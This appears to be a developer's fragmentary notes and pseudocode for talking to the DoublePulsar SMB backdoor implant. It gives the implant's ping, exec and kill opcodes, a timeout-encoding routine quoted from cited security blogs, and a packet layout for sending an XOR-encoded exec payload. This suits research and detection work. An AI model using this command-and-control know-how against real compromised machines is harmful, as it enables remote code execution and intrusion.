/
OPCODES = {
  ping: 0x23,
  exec: 0xc8,
  kill: 0x77
}

STATUS_CODES = {
  not_detected:   0x00,
  success:        0x10,
  invalid_params: 0x20,
  alloc_failure:  0x30
}
*/


/*
https://blog.rapid7.com/2019/10/02/open-source-command-and-control-of-the-doublepulsar-implant/
Ruby stuff: 

def generate_doublepulsar_timeout(op)
  k = SecureRandom.random_bytes(4).unpack('V').first
  0xff & (op - ((k & 0xffff00) >> 16) - (0xffff & (k & 0xff00) >> 8)) | k & 0xffff00
end

*/


/*
https://www.forcepoint.com/blog/x-labs/evasions-used-shadow-brokers-tools-danderspritz-and-doublepulsar-part-2-2

Timeout indicates Command
The timeout value is used in any SMB request to indicate what DoublePulsar command to execute. The sum of the bytes ANDed by 0xff gives the command:

command = ((t) + (t >> 8) + (t >> 16) + (t >> 24)) & 0x000000ff

DoublePulsar accepts the following commands:

0x23: ping
0xc8: execute
0x77: kill
*/

/*
When I crafted the SMB TRANS2_SESSION_SETUP packet, I zeroed out its parameters, since they weren't necessary for the ping and kill commands
*/



/*
However, the exec command required specific parameters to be sent. I didn't know what to fill them with yet, but it was clear the XOR key was involved.

With zeroed-out parameters, code execution was blocked by checks in the implant


*/

setup_count = 1;
setup_data = 0x000e ( little endian in unsigned char :  0x0E 0x00 )
base_offset = pkt.to_s.length + (setup_count * 2) - 4
param_offset = base_offset
 data_offset = param_offset + param.length
data = parameter + body.to_s ( convert to string )
PayloadData = parameters + XOR_DATA


	    DoublePulsarPacket.Command =  0x32;
    	DoublePulsarPacket.Flags1 =  0x18;
    	DoublePulsarPacket.Flags2 =  0xc007;

    	DoublePulsarPacket.WordCount =  14 + setup_count
    	DoublePulsarPacket.TreeID =  @tree_id
    	DoublePulsarPacket.MultiplexID =  @multiplex_id

    	DoublePulsarPacket.ParamCountTotal =  param.length
    	DoublePulsarPacket.DataCountTotal =  body.to_s.length
    	DoublePulsarPacket.ParamCountMax =  1
    	DoublePulsarPacket.DataCountMax =  0
    	DoublePulsarPacket.ParamCount =  param.length
    	DoublePulsarPacket.ParamOffset =  param_offset
    	DoublePulsarPacket.DataCount =  body.to_s.length
    	DoublePulsarPacket.DataOffset =  data_offset
    	DoublePulsarPacket.SetupCount =  setup_count
    	DoublePulsarPacket.SetupData =  setup_data
    	DoublePulsarPacket.Timeout =  “\x25\x89\xEE\x00”;
    	DoublePulsarPacket.Payload =  data


